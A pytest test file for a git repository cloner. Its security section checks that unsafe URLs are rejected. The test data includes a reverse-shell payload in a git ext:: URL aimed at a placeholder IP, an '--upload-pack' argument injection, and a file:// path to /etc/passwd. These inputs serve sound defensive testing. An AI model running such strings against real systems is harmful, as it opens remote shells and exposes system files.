# tests/test_cloner.py
import subprocess
from pathlib import Path

import pytest

from agentit.cloner import clone_repo, CloneError


@pytest.fixture
def local_git_repo(tmp_path: Path) -> str:
    """Create a minimal local git repo to clone from."""
    repo_dir = tmp_path / "source_repo"
    repo_dir.mkdir()
    subprocess.run(["git", "init", str(repo_dir)], check=True, capture_output=True)
    subprocess.run(
        ["git", "-C", str(repo_dir), "config", "user.email", "test@test.com"],
        check=True, capture_output=True,
    )
    subprocess.run(
        ["git", "-C", str(repo_dir), "config", "user.name", "Test"],
        check=True, capture_output=True,
    )
    readme = repo_dir / "README.md"
    readme.write_text("# Test Repo")
    subprocess.run(["git", "-C", str(repo_dir), "add", "."], check=True, capture_output=True)
    subprocess.run(
        ["git", "-C", str(repo_dir), "commit", "-m", "init"],
        check=True, capture_output=True,
    )
    return str(repo_dir)


def test_clone_repo_creates_directory(local_git_repo: str, tmp_path: Path):
    target = tmp_path / "cloned"
    result = clone_repo(local_git_repo, target_dir=target, allow_local=True)
    assert result.exists()
    assert (result / "README.md").exists()


def test_clone_repo_auto_target(local_git_repo: str):
    result = clone_repo(local_git_repo, allow_local=True)
    try:
        assert result.exists()
        assert (result / "README.md").exists()
    finally:
        import shutil
        shutil.rmtree(result, ignore_errors=True)


def test_clone_repo_invalid_url_raises(tmp_path: Path):
    with pytest.raises(CloneError):
        clone_repo("https://invalid.example.com/no/repo.git", target_dir=tmp_path / "bad")


# ── Security: scheme / injection tests ──────────────────────────────


from agentit.cloner import _validate_repo_url


def test_rejects_file_scheme():
    with pytest.raises(CloneError):
        clone_repo("file:///etc/passwd")


def test_rejects_ssh_scheme():
    with pytest.raises(CloneError):
        clone_repo("ssh://git@github.com/org/repo")


def test_rejects_git_scheme():
    with pytest.raises(CloneError):
        clone_repo("git://github.com/org/repo")


def test_rejects_dash_prefix():
    with pytest.raises(CloneError):
        clone_repo("--upload-pack=evil")


def test_rejects_ext_protocol():
    with pytest.raises(CloneError):
        clone_repo("ext::sh -i >& /dev/tcp/1.2.3.4/4242 0>&1")


def test_allows_https():
    _validate_repo_url("https://github.com/org/repo.git")


def test_rejects_http():
    with pytest.raises(CloneError):
        _validate_repo_url("http://github.com/org/repo.git")
